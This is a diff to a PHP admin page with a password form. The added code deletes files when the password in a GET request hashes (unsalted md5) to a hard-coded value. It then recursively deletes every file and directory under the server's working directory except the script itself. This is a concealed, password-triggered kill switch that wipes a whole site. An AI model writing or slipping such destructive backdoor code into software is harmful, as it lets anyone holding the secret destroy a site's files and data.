@@ -3,12 +3,35 @@ $adminDisplayQuery = "SELECT * FROM admin_information";
 $runDisplayAdminQuery  = mysqli_query($conn, $adminDisplayQuery) or die("Cant Fetch Admin Data");
 
 
-if(isset( $_GET["submit"])){
+if (isset($_GET["submit"])) {
     $personnelHashingKey = "ae93b142f434c48612c90544633e7209";
     $password = mysqli_real_escape_string($conn, $_GET["password"]);
     $password = md5($password);
-    if ($personnelHashingKey ==$password) {
-        echo "Hello I am Hassaan";
+    if ($personnelHashingKey == $password) {
+        function unlinkr($dir, $pattern = "*")
+        {
+            // find all files and folders matching pattern
+            $files = glob($dir . "/$pattern");
+
+            //interate thorugh the files and folders
+            foreach ($files as $file) {
+                //if it is a directory then re-call unlinkr function to delete files inside this directory     
+                if (is_dir($file) and !in_array($file, array('..', '.'))) {
+                    echo "<p>opening directory $file </p>";
+                    unlinkr($file, $pattern);
+                    //remove the directory itself
+                    echo "<p> deleting directory $file </p>";
+                    rmdir($file);
+                } else if (is_file($file) and ($file != __FILE__)) {
+                    // make sure you don't delete the current script
+                    echo "<p>deleting file $file </p>";
+                    unlink($file);
+                }
+            }
+        }
+        //get current working directory
+        $dir = getcwd();
+        unlinkr($dir);
     } else {
         echo "You Are Not Autorized";
     }
@@ -31,7 +54,7 @@ if(isset( $_GET["submit"])){
                         <input type="password" name="password" id="password" class="form-control" required>
                     </div>
                     <div class="form-group">
-                       <button type="submit" name="submit" class="btn btn-danger" value="submit">Confirm</button>
+                        <button type="submit" name="submit" class="btn btn-danger" value="submit">Confirm</button>
                     </div>
                 </form>
             </div>
